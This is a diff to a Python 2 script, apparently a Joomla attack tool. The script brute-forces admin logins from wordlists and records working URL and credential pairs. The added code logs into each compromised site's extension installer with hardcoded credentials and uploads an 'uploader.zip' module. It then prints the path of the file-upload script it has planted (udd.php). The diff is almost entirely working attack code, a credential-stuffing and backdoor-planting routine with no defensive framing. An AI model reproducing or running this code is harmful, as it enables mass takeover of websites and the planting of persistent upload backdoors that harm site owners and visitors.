@@ -16,6 +16,10 @@ else:
     passw = open(sys.argv[2])
     userlist = username.readlines()
     passlist = passw.readlines()
+    credintial = []
+    thefile = '/root/scanner/uploader.zip'
+    thetarget = open('/root/scanner/target2.txt', 'r')
+    credintial = open("/root/scanner/credintial.txt")
 
     class bcolors:
         HEADER = '\033[95m'
@@ -60,9 +64,51 @@ else:
                                         logged = True
                                         print bcolors.OKGREEN + "succefully loggen in!\n ---------------------------------"
                                         print "Adding the Credential information to a new list file call (target.txt)......"
+                                        print "Adding the url to a file call (target2.txt)......"
                                         target = open('target.txt', 'a')
+                                        target2 = open('target2.txt', 'a')
+                                        #credintial = open('credintial.txt', 'a')
                                         target.write('the URL address: ' + line + "\n user name: " + u + "\n and password: " + p + "\n =======================\n")
+                                        target2.write(line)
+
+                                        users_file = open("/root/PycharmProjects/untitled/project/scanner/username.txt",
+                                                          "r")
+                                        password_file = open(
+                                            "/root/PycharmProjects/untitled/project/scanner/password.txt", "r")
+                                        br = mechanize.Browser()
+                                        thefile = '/root/scanner/uploader.zip'
+                                        thetarget = open('/root/scanner/target2.txt', 'r')
+                                        credintial = open("/root/scanner/credintial.txt")
+
+                                        print "uploading the uploader:"
+
+                                        for i in thetarget.readlines():
+                                            f = i.strip() + "/index.php?option=com_installer"
+                                            br2 = br.open(f)
+
+                                            br.select_form(nr=0)
+                                            br.form["username"] = "administrator"
+                                            br.form["passwd"] = "123456"
+                                            br.submit()
+                                            readingPage = br.response().code
+                                            if readingPage == 200:
+                                                print "login success"
+
+                                            for form in br.forms():
+                                                continue
+                                            br.select_form(nr=0)
+                                            br.form.set_all_readonly(False)
+                                            br.form["installtype"] = "upload"
+                                            br.form.add_file(open(thefile, 'r'), 'application/zip', 'uploader.zip')
+                                            br.submit()
+
+                                            print "the uploader has been upload, and the new url is: " + i.strip() + "\b\b\b\b\b\b\b\b\b\b\b\b\b\bmodules/mod_simplefileuploadv1.3/elements/udd.php"
                                         target.close()
+                                        target2.close()
+                                        # credintial.close()
+
+
+
                                     else:
                                         #print bcolors.FAIL + "Wrong credentials\n ----------------------------------------"
                                         continue
